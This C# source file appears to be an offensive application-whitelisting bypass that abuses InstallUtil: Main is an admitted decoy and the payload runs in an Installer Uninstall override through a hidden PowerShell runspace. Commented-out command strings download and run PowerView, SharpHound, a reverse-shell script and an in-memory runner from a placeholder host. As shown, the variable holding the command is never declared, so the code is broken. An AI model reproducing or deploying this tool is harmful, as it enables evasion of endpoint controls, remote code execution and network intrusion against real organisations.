using System;
using System.Management.Automation;
using System.Management.Automation.Runspaces;
using System.Configuration.Install;

namespace Bypass
{
    class Program
    { 
        static void Main(string[] args)
        {
            Console.WriteLine("This is the main method which is a decoy");
        }
    }

    [System.ComponentModel.RunInstaller(true)]
    public class Sample : System.Configuration.Install.Installer
    {
        public override void Uninstall(System.Collections.IDictionary savedState)
        {
            
            Runspace rs = RunspaceFactory.CreateRunspace();
            rs.Open();
            PowerShell ps = PowerShell.Create();
            ps.Runspace = rs;

            //String cmd = "(New-Object System.Net.WebClient).DownloadString('http://x.x.x.x/PowerView.ps1') | IEX ; Get-DomainComputer -UnConstrained > power.txt";
            //String cmd = "$bytes = (New-Object System.Net.WebClient).DownloadData('http://x.x.x.x/doggy.exe');[Reflection.Assembly]::Load($bytes);[SharpHound.Program]::Main(('CollectionMethod All, OutputPrefix c:\\Temp\\test'))";
            //String cmd = "(New-Object System.Net.WebClient).DownloadString('http://x.x.x.x/Invoke-PowerShellTcp.ps1') | IEX";
            //String cmd = "$bytes = (New-Object System.Net.WebClient).DownloadData('x.x.x.x/Csharprunner.exe');[Reflection.Assembly]::Load($bytes);[Csharprunner.Program]::Main('')";
            ps.AddScript(cmd);

            ps.Invoke();
            rs.Close();
            

      
        }
    }
}
